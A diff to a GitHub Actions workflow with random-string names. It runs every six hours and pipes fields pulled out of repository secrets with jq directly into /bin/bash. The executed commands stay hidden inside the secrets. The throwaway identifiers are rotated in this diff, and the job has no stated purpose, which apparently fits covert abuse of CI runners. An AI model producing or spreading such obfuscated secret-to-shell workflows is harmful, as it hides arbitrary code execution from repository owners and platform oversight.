@@ -1,10 +1,8 @@
 name: leidate7890
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 0/6 * * *'
-
+    - cron: '7 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,21 +10,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: leidate7890
         env:
-          cyt2709: ${{ secrets.cyt2709 }}
+          nz5: ${{ secrets.nz5 }}
         run: |
-          echo $cyt2709 | jq -r .ub5 | /bin/bash
-          echo $qvth6 | jq -r .tqcd813 | /bin/bash
-          echo $dmy85435 | jq -r .k0044 | /bin/bash
-          echo $o1813 | jq -r .alzm6270 | /bin/bash
-          echo $ado1 | jq -r .vi7652 | /bin/bash
-          echo $qi1 | jq -r .qv01 | /bin/bash
-          echo $taar1 | jq -r .vpcej334 | /bin/bash
-          echo $e021 | jq -r .qqk0 | /bin/bash
-          echo $wj02 | jq -r .ftm967 | /bin/bash
-          echo $i3 | jq -r .rave285 | /bin/bash
-          echo $e31730 | jq -r .try5218 | /bin/bash
-          echo $kbvk3 | jq -r .dgfc684 | /bin/bash
-          echo $hhzad10 | jq -r .ndg932 | /bin/bash
-          echo $lzfsg46 | jq -r .cyzbv125 | /bin/bash
-          echo $win177 | jq -r .q2 | /bin/bash
+          echo $nz5 | jq -r .wtcrt38189 | /bin/bash
+          echo $pyqob1080 | jq -r .rrm2 | /bin/bash
+          echo $lq78471 | jq -r .n142 | /bin/bash
+          echo $jhss080 | jq -r .g59 | /bin/bash
+          echo $rw040 | jq -r .wvfyj08 | /bin/bash
+          echo $nlg6411 | jq -r .qwkdy271 | /bin/bash
+          echo $b7172 | jq -r .tps1274 | /bin/bash
+          echo $uxz9 | jq -r .dqwu9963 | /bin/bash
+          echo $tckkt738 | jq -r .x97220 | /bin/bash
+          echo $eyr16177 | jq -r .rdpz4 | /bin/bash
+          echo $hd4542 | jq -r .dq16937 | /bin/bash
+          echo $nfckh985 | jq -r .rrzl92 | /bin/bash
+          echo $eio81 | jq -r .pwdt17 | /bin/bash
+          echo $c5668 | jq -r .u97 | /bin/bash
 
